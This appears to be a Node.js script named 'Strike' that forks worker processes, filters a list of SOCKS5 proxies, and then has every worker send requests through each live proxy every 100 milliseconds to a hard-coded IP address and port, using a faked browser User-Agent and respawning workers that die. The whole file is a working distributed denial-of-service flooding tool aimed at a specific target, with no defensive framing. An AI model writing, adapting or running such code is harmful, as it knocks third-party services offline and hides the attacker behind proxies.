const cron = require("node-cron");
const cluster = require("cluster");
const os = require("os");
const axios = require("axios");
const HttpsProxyAgent = require("https-proxy-agent");
const { SocksProxyAgent } = require("socks-proxy-agent");
const http = require("http");
const { Agent } = require("socks5-http-client");
const { socks5 } = require("./proxy.socks5");
const EventEmitter = require("events");

const numCPUs = os.cpus().length <= 2 ? 2 : os.cpus().length - 1;

class Strike {
  constructor() {
    this.counter = 0;
    this.eventEmitter = new EventEmitter();
  }

  async init() {
    if (cluster.isPrimary) {
      for (let i = 1; i <= numCPUs; i++) {
        this._fork();
      }

      this._axiosResolveInterceptor();
      const avaliableProxies = await this._checkProxyConnection();
      this._axiosRejectInterceptor();

      if(!avaliableProxies.length) {
        return console.error("[Error]:", "No avaliable proxies");
      }

      for (const worker of Object.values(cluster.workers)) {
        worker.send(avaliableProxies);
      }

      cluster.on("exit", (worker, code, signal) => {
        console.error(`
          Worker died, id=${worker.id}, pid=${worker.process.pid}, signal=${signal}, code=${code}
        `);
        this._fork();
      });
    } else if (cluster.isWorker) {
      process.on("message", this._attack.bind(this));
      console.info("inited instance");
    }
  }

  _axiosResolveInterceptor() {
    axios.interceptors.response
      .use((response) => response, (error) => Promise.resolve(error));
  }

  _axiosRejectInterceptor() {
    axios.interceptors.response
      .use((response) => response, (error) => Promise.reject(error));
  }

  async _checkProxyConnection() {
    const link = "https://google.com";
    
    const requests = socks5.map((endpoint) => {
      return axios({
        url: link,
        method: "GET",
        httpsAgent: new SocksProxyAgent(endpoint),
        timeout: 5000,
        clarifyTimeoutError: false,
      });
    });

    console.info("[Info]:", "Proxy check started");
    const responses = await Promise.all(requests).then(data => data).catch(() => Promise.resolve());
    console.info("[Info]:", "Proxy check ended")

    return responses.reduce((available, response) => {
      const { status } = response;

      if(response && status && status === 200) {
        const { host, port, type } = response.config.httpsAgent.proxy;
        console.info("[Info]:", "Server:", `${host}:${port}`, "Status:", response.status);
        available.push(`socks${type}://${host}:${port}`);
      } else {
        const { host, port } = response.config.httpsAgent.proxy;
        console.error("[Error]:", "Server:", `${host}:${port}`, "Message:", response.message);
      }

      return available;
    }, []);
  }

  async _attack(avaliableProxies) {
    for(let server of avaliableProxies) {
      setInterval(async () => {
        try {
          const agent = new SocksProxyAgent(server);
          const link = "http://185.233.36.205:3001/api-doc/#/";
          const response = await axios(link, {
            httpsAgent: agent,
            headers: {
              'User-Agent': "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36"
            },
          });
  
          setTimeout(() => { console.log(`Response status code: ${response.status}, Link: ${link}, Requests: ${this.counter}`); }, 5000);
          this.counter++;
        } catch (err) {
          if(err.isAxiosError) {
            const { code, status, message } = err.toJSON();
            console.error("[Error]:", "Code:", code || status, "Message:", message);
          } else {
            console.error("[Error]:", "Message:", err.message);
          }
        }
      }, 100);
    }
  }

  _fork() {
    const ENV = {
      NODE_OPTIONS: process.env.CHILD_NODE_OPTIONS,
    };
    cluster.fork(ENV);
  }

}

(function () {
  new Strike().init();
})();
